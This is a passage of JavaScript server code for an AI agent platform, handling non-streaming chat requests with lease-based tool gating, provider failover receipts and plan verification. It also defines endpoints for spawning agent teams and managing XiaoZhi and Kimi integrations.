          appendChatTurn(chatSessionId, 'user', message, body.source || 'chat');
          appendChatTurn(chatSessionId, 'assistant', semantic.reply, body.source || 'chat');
          return sendJson(res, semantic.ok ? 200 : 409, {
            ok: semantic.ok,
            reply: semantic.reply,
            model: semantic.model,
            provider: semantic.provider,
            sessionId: chatSessionId,
            historyTurns: getChatHistory(chatSessionId).length,
            missionId: semantic.mission && semantic.mission.missionId,
            tool_calls: [{
              tool: semantic.resolution.matched.capability,
              args: semantic.resolution.matched.args,
              ok: semantic.ok,
              driver: semantic.dispatch.driver || null,
              verification: semantic.dispatch.verification || null,
            }],
            turns: 'deterministic-intent',
          });
        }

        // Use the real agent-loop (same tool-calling brain as CLI ask and SSE chat).
            // ══════════════════════════════════════════════════════════════
            // GATE 1 — IS_CHAT_FAST: no lease → chat-fast, not runAgent.
            // Mirrors handleChatStream gate at line ~864.
            // No lease = conversational reply only, regardless of semantic intent.
            const _nsChatIntent = TA.classifyIntentEx(message);
            // WORK SESSION LAW: lease = operator armed WORK = agent loop, always.
            const IS_CHAT_FAST_NONSTREAM = !nsEffectiveLease;
            safeLog('GATE1', `[nonstream] lease=${nsEffectiveLease ? 'YES' : 'null'} intent=${_nsChatIntent.route} IS_CHAT_FAST=${IS_CHAT_FAST_NONSTREAM} msg="${String(message).slice(0, 40)}"`);
            if (IS_CHAT_FAST_NONSTREAM) {
              // AUTO POOL ISOLATION LAW: an explicit provider/model:'auto' in
              // the request body means scored-pool routing and must NOT adopt
              // the server-side manual pin. Pin fallback only applies when the
              // body is silent on that field.
              const _nsPin = RR.getRouterState().manual_pin;
              const _bodyAuto = (body.provider === 'auto' || body.model === 'auto');
              const _pin = _bodyAuto ? null : _nsPin;
              const _nsModel = (body.model && body.model !== 'auto') ? body.model : (_pin && _pin.model ? _pin.model : undefined);
              const _nsProvider = (body.provider && body.provider !== 'auto' && body.provider !== 'default') ? body.provider : (_pin && _pin.provider ? _pin.provider : undefined);
              // MANUAL PIN FAIL-CLOSED LAW (nonstream boundary, mirrors :1327):
              // unknown provider names 400 instead of silently re-pooling.
              if (_nsProvider && !LLM.PROVIDERS[_nsProvider]) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                return res.end(JSON.stringify({ ok: false, error: 'UNKNOWN_PROVIDER_PIN', detail: `provider '${_nsProvider}' is not registered; manual pins must fail closed`, knownProviders: Object.keys(LLM.PROVIDERS) }));
              }
              // GATE 2 LAW (non-stream mirror of :1218): lease → advertise agent tools.
              // BABYSITTER CAPABILITY GATE (mirror of SSE site :1732): narrow
              // leased tool set by semantic intent class.
              let _nsTools = nsEffectiveLease ? getAgentTools() : [];
              if (nsEffectiveLease && Array.isArray(_nsTools)) {
                const _nsGate = BABYSITTER.capabilityGate({ intentClass: _nsChatIntent.route, tools: _nsTools, route: _nsChatIntent.route, leaseSource: nsEffectiveLease.source || String(nsEffectiveLease) });
                if (_nsGate.narrowed) {
                  _nsTools = _nsGate.tools;
                  safeLog('GATE2', `[nonstream] intent=${_nsChatIntent.route} allowed=${_nsGate.tools.length} denied=${JSON.stringify(_nsGate.denied)}`);
                }
              }
              const _nsChatOpts = { model: _nsModel, provider: _nsProvider, tools: _nsTools,
                __explicitAuto: _bodyAuto, // TVG S6: suppress pin-file re-adoption in streamChatAuto
                // KEEP-WORKING LAW (2026-08-25): the nonstream HTTP lane is a
                // buffered consumer — it assembles the full reply before
                // responding, so a mid-stream provider death with zero tokens
                // served can safely advance to the next AUTO candidate instead
                // of surfacing a 500 to the user while healthy models wait.
                // MANUAL PIN FAIL-CLOSED LAW (2026-08-26) supersedes this for
                // pins: an explicit provider/model pin never fails over — the
                // pin's error surfaces verbatim.
                failClosedManual: !!(_nsProvider || _nsModel),
                allowPartialFailover: !(_nsProvider || _nsModel) };
              const _nsChatSystemPrompt = buildChatSystemPrompt({
                cwd: body.cwd || process.cwd(),
                workspace: body.workspaceRoot || process.cwd(),
                historyLength: chatHistory.length,
                turnNumber: chatHistory.length + 1,
                model: _nsModel || undefined,
              });
              const _nsHistory = [
                { role: 'system', content: _nsChatSystemPrompt },
                ...chatHistory,
                { role: 'user', content: message },
              ];
              let _nsFullReply = '';
              let _nsModel2 = '';
              let _nsProvider2 = '';
              try {
                for await (const _nsChunk of LLM.streamChatAuto(_nsHistory, _nsChatOpts)) {
                  if (_nsChunk.content) _nsFullReply += _nsChunk.content;
                  _nsModel2 = _nsChunk.model || _nsModel2;
                  _nsProvider2 = _nsChunk.provider || _nsProvider2;
                }
              } catch (_nsCfStreamErr) {
                // KEEP-WORKING TERMINAL LAW (2026-08-25): every AUTO attempt
                // chain ends in an honest receipt — including total failure.
                // A naked 500 with no receipt hides which candidates were
                // tried and why each died. Harvest attempts, emit the
                // terminal receipt, and return a structured failure so the
                // UI can say 'all N candidates failed' instead of blank.
                const _nsCfFailAttempts = Array.isArray(_nsChatOpts.__providerAttempts) ? _nsChatOpts.__providerAttempts : [];
                safeLog('ROUTING_RECEIPT', '[ns-chatfast-terminal] ' + JSON.stringify({
                  sessionId: chatSessionId,
                  requestedProvider: _nsProvider || null,
                  requestedModel: _nsModel || null,
                  attempted: _nsCfFailAttempts.map(a => ({ provider: a.provider, model: a.model || null, ok: false, reason: a.reason || a.failureClass || 'unknown' })),
                  served: null,
                  terminalFailure: String(_nsCfStreamErr && _nsCfStreamErr.message || _nsCfStreamErr).slice(0, 300),
                  at: Date.now(),
                }).slice(0, 1200));
                return sendJson(res, 502, {
                  ok: false,
                  error: 'ALL_CANDIDATES_FAILED',
                  message: 'Every eligible AUTO candidate failed; no reply served.',
                  terminalFailure: String(_nsCfStreamErr && _nsCfStreamErr.message || _nsCfStreamErr).slice(0, 300),
                  providerAttempts: _nsCfFailAttempts,
                  sessionId: chatSessionId,
                });
              }
              // PROVIDER ATTEMPTS HARVEST (chat-fast lane): streamChatAuto stamps
              // the attempt chain onto _nsChatOpts at generator completion — same
              // contract as the agent lane harvest in agent-loop.js.
              const _nsCfAttempts = Array.isArray(_nsChatOpts.__providerAttempts) ? _nsChatOpts.__providerAttempts : [];
              // EXECUTION PROMISE GATE (nonstream CHAT_FAST mirror of :6070):
              // chat lane has zero authority, so immediate-action language here
              // is always a lie class — annotate before persisting.
              try {
                if (_nsFullReply) {
                  const _nsCfViolations = RT.checkExecutionPromises(_nsFullReply);
                  if (_nsCfViolations.length) {
                    safeLog('CHAT', 'EXECUTION_PROMISE_CONTRADICTION(nonstream-chatfast): ' + _nsCfViolations.map(v => v.matchedText).join(' | '));
                    _nsFullReply += '\n\n[system note: this reply contained immediate-action promises but no execution authority was granted and no tools ran this turn. The described actions were NOT performed.]';
                  }
                }
              } catch (_nsCfGateErr) { console.error('[nonstream-chat] chatfast promise gate failed (non-fatal): ' + _nsCfGateErr.message); }
              appendChatTurn(chatSessionId, 'user', message, body.source || 'chat');
              // MODE-OFFER LAW (nonstream CHAT_FAST): runtime saw execution
              // intent but zero authority — tell the surface so it can offer
              // [Run once] / [Switch to Work]. Structured field, never model text.
              const _nsModeOffer = (_nsChatIntent && _nsChatIntent.route === 'EXECUTE')
                ? { kind: 'EXECUTION_INTENT_NO_LEASE', capability: null, offers: ['RUN_ONCE', 'SWITCH_TO_WORK'] }
                : null;
              // Think-leak law (mirror of agent-lane :6511): reasoning must not
              // reach the visible chat-fast reply OR the persisted history.
              const _nsCfVisibleReply = _nsFullReply.replace(/<think>[\s\S]*?<\/think>/gi, '').trim();
              const _nsTelemetry = {
                requestedProvider: _nsProvider || 'auto',
                requestedModel: _nsModel || 'auto',
                provider: _nsProvider2 || null,
                model: _nsModel2 || null,
                route: 'CHAT', lease: null,
                toolCalls: 0, agentCalls: 0, skillCalls: 0,
                fallbackCount: 0, fallbackPath: [],
                providerAttempts: _nsCfAttempts,
                promptTokens: null, completionTokens: null, reasoningTokens: null, totalTokens: null,
                reasoningState: null, ttftMs: null, durationMs: null,
                status: 'complete',
              };
              appendChatTurn(chatSessionId, 'assistant', _nsCfVisibleReply, body.source || 'chat', _nsTelemetry);
              // CANONICAL ROUTE TRUTH (nonstream chat-fast): same schema, third
              // transport. One router, one truth — surfaces never reconstruct.
              try {
                const RR = require('./lib/routing-receipt.js');
                _nsTelemetry.routingReceipt = RR.buildReceipt({
                  sessionId: chatSessionId,
                  // TVG S5/S6 LAW: this lane pre-resolves 'auto' into the pin
                  // (:6692). Forward the RAW body values so buildReceipt can
                  // still see an explicit AUTO request and refuse to classify
                  // it as MANUAL via the persisted pin.
                  requestedProvider: (_bodyAuto && body.provider) ? body.provider : (_nsProvider || null),
                  requestedModel: (_bodyAuto && body.model) ? body.model : (_nsModel || null),
                  providerAttempts: _nsCfAttempts,
                  servedProvider: _nsProvider2 || null,
                  servedModel: _nsModel2 || null,
                  replyText: _nsFullReply,
                  manualOverrideApplied: (_nsChatOpts && _nsChatOpts.__manualOverrideApplied) || null,
                  scoredPick: (_nsChatOpts && _nsChatOpts.__scoredRouterApplied) || null,
                  affinityApplied: (_nsChatOpts && _nsChatOpts.__affinityApplied) || null,
                  inferenceNode: 'home-core',
                  executionNode: null,
                });
              } catch (_nsCfRrErr) { safeLog('CHAT', `routing-receipt build failed (ns-cf): ${_nsCfRrErr && _nsCfRrErr.message}`); }
              if (_nsTelemetry.routingReceipt) safeLog('ROUTING_RECEIPT', '[ns-chatfast] ' + JSON.stringify(_nsTelemetry.routingReceipt).slice(0, 1200));
              return sendJson(res, 200, {
                ok: true,
                reply: _nsCfVisibleReply,
                model: _nsModel2,
                provider: _nsProvider2 || null,
                routingReceipt: _nsTelemetry.routingReceipt || undefined,
                telemetry: _nsTelemetry,
                providerAttempts: _nsCfAttempts,
                modeOffer: _nsModeOffer,
                sessionId: chatSessionId,
                historyTurns: getChatHistory(chatSessionId).length,
              });
            }
            // ══════════════════════════════════════════════════════════════
            // EXECUTION PATH: lease exists and intent is EXECUTE/COMMAND/etc.

        // This kills the keyword if-ladder that was routing to one-shot tower calls.
        // runAgent/getAgentTools come from the handler-top destructure (line ~3715).
        let fullReply = '';
        let modelName = '';
        let providerName = '';
        const providerFailovers = [];
    const turnIntegrityEvents = [];
        let toolCalls = [];
        // TOOL RECEIPTS (nonstream): agent-loop emits step-receipt per executed
        // tool; SSE lane surfaces them (:1794) but this lane dropped them.
        const toolReceipts = [];
        let steeringCapsuleId = null;
        let _agentAttemptsReceipt = []; // harvested from runAgent opts after the loop
        // Declared before use: runAgent mutates this object in place —
        // __providerAttempts is stamped onto it by agentTurn's harvest.
        const _nsAgentOpts = { maxTokens: 4096, temperature: 0.7, sessionId: chatSessionId, envelope: body.envelope || {}, tools: nsEffectiveLease ? getAgentTools() : [], effectiveLease: nsEffectiveLease,
          // ZERO-GATES-IN-WORK LAW (2026-08-26): a granted WORK session lifts
          // the default 10-turn cap (agent-loop raises to 100) on BOTH lanes.
          // The SSE lane already passes this; the nonstream lane dropped it,
          // so long-horizon builds died at turn 10 here only.
          workSessionActive: !!(nsEffectiveLease && nsEffectiveLease.source === 'WORK_SESSION'),
          thinkLevel: body.thinkLevel, // composer slider → adapter (parity with SSE lane)
          // CONTINUATION LAW: mode/executionIntent must reach the agent loop or the
          // WORK-mode completion critic never arms here either
          // (agent-loop.js gates it on executionMode === 'work').
          mode: (String(body.interactionMode || body.mode || 'CHAT').toUpperCase() === 'WORK') ? 'work' : 'chat',
          executionIntent: !!body.executionIntent };
        // AUTO-PLAN GATE (Eddie law 2026-08-26): long-horizon WORK jobs get a
        // plan-first directive; the plan must pass verifyPlan() before EXECUTE.
        let _planDirective = '';
        if (_nsAgentOpts.workSessionActive && !_planApproved.has(chatSessionId)) {
          const _pc = AUTO_PLAN.classifyPlanNeed({ message, workSessionActive: true, planApproved: false });
          if (_pc.planRequired) {
            _planDirective = '\n\n[AUTO-PLAN MODE] This is a long-horizon job. FIRST reply with a numbered build plan (each step: action + target). Do NOT execute anything until your plan passes verification. End the plan with a line exactly: PLAN_COMPLETE';
            try { safeLog('AUTO_PLAN', JSON.stringify({ engaged: true, sessionId: chatSessionId, reason: _pc.reason })); } catch (_) {}
          }
        }
        const errors = [];
        // DEFENSIVE: catch synchronous throws before the for-await starts
        let _runGen;
        try {
          _runGen = runAgent({
          prompt: attachmentPreamble(body.attachments) + message + _planDirective,
          history: chatHistory,                 // ← carry the conversation here too
          model: body.model || undefined,
          provider: body.provider || undefined,
          // Envelope travels on BOTH /api/chat variants. It rode only the SSE
          // path at first, so a non-streaming client silently ran ungoverned —
          // the access dial has to hold whichever transport the caller picks.
          // EXECUTION LEASE — threaded through to runAgent for Gate 3 assertion.
          opts: _nsAgentOpts,
        });        } catch (_runInitErr) {
          // Sync throw from runAgent({...}) construction — caught before the
          // for-await even starts. Respond with a clean error rather than a crash.
          console.error('[nonstream-chat] runAgent() synchronous throw:', _runInitErr && _runInitErr.message ? _runInitErr.message : String(_runInitErr));
          console.error('[nonstream-chat] stack:', _runInitErr && _runInitErr.stack ? _runInitErr.stack.slice(0, 800) : 'no stack');
          return sendJson(res, 500, { error: 'runAgent init failed: ' + (_runInitErr && _runInitErr.message ? _runInitErr.message : String(_runInitErr)) });
        }
        // DEFENSIVE: wrap the for-await to catch async throws from inside the generator
        try {
        for await (const ev of _runGen) {
          if (ev.type === 'token') {
            fullReply += ev.content;
            modelName = ev.model || modelName;
            providerName = ev.provider || providerName;
          } else if (ev.type === 'turn-integrity') {
        // Transport evidence: the model's stream did not arrive whole. Surfaced
        // so an incomplete answer is visible as damage rather than read as a
        // short but finished reply.
        turnIntegrityEvents.push({ turn: ev.turn, classification: ev.classification,
          defects: (ev.defects || []).map(d => d.type) });
        sseEvent(res, 'turn-integrity', { ok: false, turn: ev.turn,
          classification: ev.classification,
          defects: (ev.defects || []).map(d => ({ type: d.type, detail: d.detail })),
          lastConfirmedSeq: ev.lastConfirmedSeq, expectedNextSeq: ev.expectedNextSeq,
          terminatorPresent: ev.terminatorPresent,
          observedBytes: ev.observedBytes, declaredBytes: ev.declaredBytes });
      } else if (ev.type === 'provider-failover') {
            providerFailovers.push({ from: ev.from, to: ev.to, reason: ev.reason,
              statusCode: ev.statusCode || null, detail: ev.detail || null,
              cooldownMs: ev.cooldownMs || 0, cooldownUntil: ev.cooldownUntil || null });
          } else if (ev.type === 'steering') {
            steeringCapsuleId = ev.capsuleId || null;
          } else if (ev.type === 'steering-blocked') {
            errors.push(`steering: completion blocked (${ev.conflicts.length} unresolved conflict${ev.conflicts.length === 1 ? '' : 's'}) pending operator escalation`);
          } else if (ev.type === 'tool-call') {
            toolCalls.push({ tool: ev.tool, args: ev.args, capsuleId: ev.capsuleId });
          } else if (ev.type === 'tool-result') {
            // RECEIPT LAW (nonstream): tool executions surface as receipts, not
            // just SSE. Mirrors the step-receipt event the SSE lane emits.
            toolReceipts.push({ turn: ev.turn || null, tool: ev.tool, ok: ev.ok !== false,
              resultPreview: typeof ev.result === 'string' ? String(ev.result).slice(0, 300)
                : (ev.result == null ? null : String(JSON.stringify(ev.result)).slice(0, 300)) });
          } else if (ev.type === 'step-receipt') {
            toolReceipts.push({ turn: ev.turn, tool: ev.tool, ok: ev.ok !== false,
              stepIndex: ev.stepIndex, capsuleId: ev.capsuleId || null });
          } else if (ev.type === 'error') {
            errors.push(ev.error);
          } else if (ev.type === 'done') {
            modelName = ev.model || modelName;
            providerName = ev.provider || providerName;
            // EXECUTION PROMISE GATE (nonstream mirror of SSE :1944): immediate-action
            // language with no lease and zero tool calls = "Watch me. SCANNING:" lie class.
            try {
              const _nsNoAuthority = !nsEffectiveLease && toolCalls.length === 0;
              if (_nsNoAuthority && fullReply) {
                const _nsEpViolations = RT.checkExecutionPromises(fullReply);
                if (_nsEpViolations.length) {
                  safeLog('CHAT', 'EXECUTION_PROMISE_CONTRADICTION(nonstream): ' + _nsEpViolations.map(v => v.matchedText).join(' | '));
                  fullReply += '\n\n[system note: this reply contained immediate-action promises but no execution authority was granted and no tools ran this turn. The described actions were NOT performed.]';
                }
              }
            } catch (_nsGateErr) { console.error('[nonstream-chat] promise gate failed (non-fatal): ' + _nsGateErr.message); }
            // AUTO-PLAN completion: if this turn was a plan proposal and it ends
            // with PLAN_COMPLETE, run the triple verification. PASS → session
            // approved (EXECUTE resumes); FAIL → directive re-arms next turn.
            try {
              if (_planDirective && /PLAN_COMPLETE\s*$/.test(fullReply.trim())) {
                const plan = AUTO_PLAN.parsePlanText ? AUTO_PLAN.parsePlanText(fullReply)
                  : { steps: fullReply.split('\n').filter(l => /^\s*\d+[.)]/.test(l)).map((l, i) => ({ order: i + 1, action: l.trim() })) };
                const v = AUTO_PLAN.verifyPlan(plan);
                if (v.verdict === 'PASS') {
                  _planApproved.add(chatSessionId);
                  safeLog('AUTO_PLAN', JSON.stringify({ sessionId: chatSessionId, verdict: 'PASS', checks: v.checks.length }));
                } else {
                  safeLog('AUTO_PLAN', JSON.stringify({ sessionId: chatSessionId, verdict: 'FAIL', failed: v.checks.filter(c => !c.ok).map(c => c.name) }));
                  fullReply += '\n\n[system: plan FAILED verification (' + v.checks.filter(c => !c.ok).map(c => c.name).join(', ') + '). Revise the plan; do not execute.]';
                }
              }
            } catch (_apErr) { console.error('[nonstream-chat] auto-plan check failed (non-fatal): ' + _apErr.message); }
            break;
          }
        }
        } catch (_runErr) {
          // Catches sync throws from runAgent(...) and async throws from the generator
          console.error('[nonstream-chat] runAgent error:', _runErr && _runErr.message ? _runErr.message : String(_runErr));
          console.error('[nonstream-chat] stack:', _runErr && _runErr.stack ? _runErr.stack.slice(0, 800) : 'no stack');
          // KEEP-WORKING TERMINAL LAW (2026-08-25): agent-lane mirror of the
          // chat-fast terminal receipt (:6358). Total failure must still emit
          // an honest attempt chain — never a naked 500 with zero evidence.
          const _nsAgentFailAttempts = Array.isArray(_nsAgentOpts.__providerAttempts) ? _nsAgentOpts.__providerAttempts : [];
          try {
            safeLog('ROUTING_RECEIPT', '[nonstream-agent-terminal] ' + JSON.stringify({
              sessionId: chatSessionId,
              requestedProvider: body.provider || null,
              requestedModel: body.model || null,
              attempted: _nsAgentFailAttempts.map(a => ({ provider: a.provider, model: a.model || null, ok: false, reason: a.reason || a.failureClass || 'unknown' })),
              served: null,
              terminalFailure: String(_runErr && _runErr.message || _runErr).slice(0, 300),
              at: Date.now(),
            }).slice(0, 1200));
          } catch (_) {}
          return sendJson(res, 502, {
            ok: false,
            error: 'ALL_CANDIDATES_FAILED',
            message: 'Every eligible candidate failed in the execution lane; no reply served.',
            terminalFailure: String(_runErr && _runErr.message ? _runErr.message : String(_runErr)).slice(0, 300),
            providerAttempts: _nsAgentFailAttempts,
            sessionId: chatSessionId,
          });
        }

        // PROVIDER ATTEMPTS HARVEST (nonstream agent lane): agentTurn stamps the
        // attempt chain onto the opts object we passed — surface it in the response.
        _agentAttemptsReceipt = Array.isArray(_nsAgentOpts.__providerAttempts) ? _nsAgentOpts.__providerAttempts : [];

        appendChatTurn(chatSessionId, 'user', message, body.source || 'chat');
        // Think-leak law (same as child-jobs): reasoning must not persist into
        // the visible nonstream reply.
        const _nsVisibleReply = fullReply.replace(/<think>[\s\S]*?<\/think>/gi, '').trim();
        appendChatTurn(chatSessionId, 'assistant', _nsVisibleReply, body.source || 'chat');

        // AUTO-PLAN verification: if this turn carried a plan (PLAN_COMPLETE),
        // parse it and verify. PASS → session approved for EXECUTE; FAIL →
        // reply gets a verdict footer and the gate re-arms next turn.
        if (_planDirective && /PLAN_COMPLETE/.test(_nsVisibleReply)) {
          try {
            const steps = _nsVisibleReply.split(/\n/).filter((l) => /^\s*\d+[.)]/.test(l)).map((l) => {
              const m = l.replace(/^\s*\d+[.)]\s*/, '');
              return { action: m.slice(0, 200) };
            });
            const v = AUTO_PLAN.verifyPlan({ steps });
            if (v.verdict === 'PASS') {
              _planApproved.add(chatSessionId);
              try { safeLog('AUTO_PLAN', JSON.stringify({ sessionId: chatSessionId, verdict: 'PASS', steps: steps.length })); } catch (_) {}
            } else {
              fullReply += '\n\n[AUTO-PLAN VERDICT: FAIL — plan did not pass structural verification (' + v.checks.filter((c) => !c.ok).map((c) => c.name).join(', ') + '). Revise the plan; execution stays gated.]';
              try { safeLog('AUTO_PLAN', JSON.stringify({ sessionId: chatSessionId, verdict: 'FAIL', checks: v.checks.filter((c) => !c.ok).map((c) => c.name) })); } catch (_) {}
            }
          } catch (_pvErr) { try { safeLog('AUTO_PLAN', JSON.stringify({ error: String(_pvErr).slice(0, 120) })); } catch (_) {} }
        }

        // CANONICAL ROUTE TRUTH (nonstream lane): same receipt schema as SSE —
        // both transports share one truth. Served identity = chunk echoes.
        let _nsReceipt = null;
        try {
          _nsReceipt = RR.buildReceipt({
            sessionId: chatSessionId,
            requestedProvider: body.provider || null,
            requestedModel: body.model || null,
            providerAttempts: _agentAttemptsReceipt,
            // KEEP-WORKING TRUTH LAW (2026-08-25): forward the fallback marker
            // so routing_mode reports AUTO when a dead preference was
            // re-served by streamChatAuto.
            keepWorkingFallback: (_agentAttemptsReceipt || []).some(a => a.failureClass === 'requested-model-failed'),
            servedProvider: providerName || null,
            servedModel: modelName || null,
            replyText: _nsVisibleReply,
            manualOverrideApplied: (_nsAgentOpts && _nsAgentOpts.__manualOverrideApplied) || null,
            scoredPick: (_nsAgentOpts && _nsAgentOpts.__scoredRouterApplied) || null,
            affinityApplied: (_nsAgentOpts && _nsAgentOpts.__affinityApplied) || null,
            inferenceNode: 'home-core',
            executionNode: toolCalls.length > 0 ? 'home-pc' : null,
          });
        } catch (_nsRrErr) { safeLog('CHAT', `routing-receipt build failed (nonstream): ${_nsRrErr && _nsRrErr.message}`); }
        if (_nsReceipt) safeLog('ROUTING_RECEIPT', '[nonstream] ' + JSON.stringify(_nsReceipt).slice(0, 1200));

        return sendJson(res, 200, {
          ok: true,
          reply: _nsVisibleReply,
          model: modelName,
          provider: providerName || null,
          providerFailovers,
          routingReceipt: _nsReceipt || undefined,
          providerAttempts: _agentAttemptsReceipt,
          sessionId: chatSessionId,
          historyTurns: getChatHistory(chatSessionId).length,
          capsuleId: steeringCapsuleId || undefined,
          tool_calls: toolCalls,
          toolReceipts: toolReceipts.length > 0 ? toolReceipts : undefined,
          errors: errors.length > 0 ? errors : undefined,
          turns: toolCalls.length > 0 ? 'multi-turn' : 'single',
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/tower/spawn' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { agentName, task, teamId, parentId } = body;
        if (!agentName) return sendJson(res, 400, { error: 'agentName required' });
        const result = await AgentTower.spawnAgent(agentName, task || 'No task specified', { teamId, parentId });
        if (result.success) {
          broadcast({ type: 'tower_agent_spawned', agentId: result.agent.id, name: agentName, task, timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, agentId: result.agent.id, agent: result.agent });
        }
        return sendJson(res, 500, { error: result.error });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/tower/team' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { name, leader, members, task, priority } = body;
        if (!leader) return sendJson(res, 400, { error: 'leader required' });
        const result = await AgentTower.spawnTeam({ name, leader, members, task: task || 'Team task', priority });
        if (result.success) {
          broadcast({ type: 'tower_team_spawned', teamId: result.team.id, name: result.team.name, leader, members, timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, teamId: result.team.id, team: result.team });
        }
        return sendJson(res, 500, { error: result.error });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname.startsWith('/api/tower/agents/') && method === 'DELETE') {
      const agentId = pathname.split('/')[4];
      const result = AgentTower.killAgent(agentId);
      if (result.success) {
        broadcast({ type: 'tower_agent_killed', agentId, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, result });
      }
      return sendJson(res, 404, { error: result.error || 'Agent not found' });
    }

    if (pathname.startsWith('/api/tower/team/') && method === 'DELETE') {
      const teamName = pathname.split('/')[4];
      const status = AgentTower.getAgentStatus();
      const team = status.teams.find(t => t.name === teamName || t.id === teamName);
      if (!team) return sendJson(res, 404, { error: 'Team not found' });
      const result = AgentTower.killTeam(team.id);
      broadcast({ type: 'tower_team_disbanded', teamId: team.id, name: teamName, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, result });
    }

    if (pathname === '/api/xiaozhi/link' && method === 'GET') {
      // Status for UI/chat. URL echoed WITHOUT query/token — safe to render.
      let urlSafe = null;
      try { const u = new URL(xiaozhiLink.url); u.search = ''; urlSafe = u.toString(); }
      catch (_) { urlSafe = xiaozhiLink.url ? '(configured)' : null; }
      return sendJson(res, 200, { ...xiaozhiLink, url: urlSafe });
    }

    if (pathname === '/api/xiaozhi/link' && method === 'POST') {
      // Fail-closed link refresh: probe-verify the new MCP endpoint BEFORE
      // swapping it in or persisting it. The token never appears in logs.
      try {
        const body = await parseBody(req);
        const url = String(body.url || '').trim();
        if (!url) return sendJson(res, 400, { error: 'url required (full wss://...mcp/?token=... endpoint)' });
        if (!/^wss?:\/\//i.test(url)) return sendJson(res, 400, { error: 'url must start with wss:// or ws://' });

        const probeOk = await new Promise((resolve) => {
          let settled = false;
          const done = (ok) => { if (!settled) { settled = true; try { probe.terminate(); } catch (_) {} resolve(ok); } };
          const probe = new WebSocket(url);
          const t = setTimeout(() => done(false), 10000);
          probe.on('open', () => {
            probe.send(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2024-11-05', capabilities: {}, clientInfo: { name: 'purpclaw-probe', version: '1.0' } } }));
          });
          probe.on('message', (d) => {
            try {
              const m = JSON.parse(d.toString());
              if (m.id === 1 && !m.error) { clearTimeout(t); done(true); }
              else if (m.id === 1) { clearTimeout(t); done(false); }
            } catch (_) {}
          });
          probe.on('error', () => { clearTimeout(t); done(false); });
          probe.on('close', () => { clearTimeout(t); done(false); });
        });
        if (!probeOk) {
          return sendJson(res, 400, { ok: false, error: 'probe failed — endpoint did not answer MCP initialize within 10s; NOT swapping link' });
        }

        const prevUrl = xiaozhiLink.url;
        xiaozhiLink.url = url;
        // Persist to .env so restarts survive (token stays out of logs).
        try {
          const envPath = path.join(__dirname, '.env');
          let envText = fs.readFileSync(envPath, 'utf8');
          const lineRe = /^XIAOZHI_(WS_URL|MCP_URL)=.*$/gm;
          const newLine = `XIAOZHI_WS_URL=${url}`;
          if (/^XIAOZHI_WS_URL=/m.test(envText)) envText = envText.replace(/^XIAOZHI_WS_URL=.*$/m, newLine);
          else if (/^XIAOZHI_MCP_URL=/m.test(envText)) envText = envText.replace(/^XIAOZHI_MCP_URL=.*$/m, newLine);
          else envText = envText.replace(/\n?$/, '\n') + newLine + '\n';
          fs.writeFileSync(envPath, envText, 'utf8');
        } catch (e) { console.log('[XIAOZHI] .env persist failed:', e.message); }

        reconnectAttempts = 0;                       // fresh credential, fresh backoff
        connectWS();                                 // swap is live immediately
        console.log(`[XIAOZHI] Link refreshed via API (probe PASS). Prev url ended ...${(prevUrl || '').slice(-6)}`);
        return sendJson(res, 200, { ok: true, status: xiaozhiLink.status, probedAt: new Date().toISOString() });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/tower/connect' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const url = body.url || xiaozhiLink.url;
        if (!url) return sendJson(res, 400, { error: 'No XiaoZhi WS URL configured and no url provided' });
        const result = AgentTower.connectToBall(url);
        return sendJson(res, 200, { ok: result.success, status: result.status, url });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== KIMI API ENDPOINTS ==========
    if (pathname === '/api/kimi/status' && method === 'GET') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized', hint: 'Set KIMI_API_KEY environment variable' });
      return sendJson(res, 200, {
        kimiEnabled: true,
        usage: kimiClient.getUsage(),
        costEstimate: kimiClient.getCostEstimate()
      });
    }

    if (pathname === '/api/kimi/parse' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { text } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        const parsed = kimiClient.parseCommand(text);
        return sendJson(res, 200, parsed);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/plan' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { text, swarmState } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        const intent = kimiClient.parseCommand(text);
        const plan = kimiClient.createPlan(intent, swarmState || {});
        return sendJson(res, 200, plan);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/spawn' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { tier, name, role, mission, objective, tools } = body;
        const subagent = await kimiClient.spawnSubagent({
          tier: tier || 'Standard',
          name: name || 'KimmiSubagent',
          role: role || 'TaskExecutor',
          mission: mission || 'Execute assigned task',
          objective: objective || text || 'Complete task',
          tools: tools || []
        });
        return sendJson(res, 200, subagent);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/team' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { tier, mission, objectives, tools, agentCount } = body;
        const team = await kimiClient.spawnTeam({
          tier: tier || 'Standard',
          mission: mission || 'Team objective',
          objectives: objectives || ['Execute task 1', 'Execute task 2', 'Execute task 3'],
          tools: tools || [],
          agentCount: agentCount || 3
        });
        return sendJson(res, 200, team);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

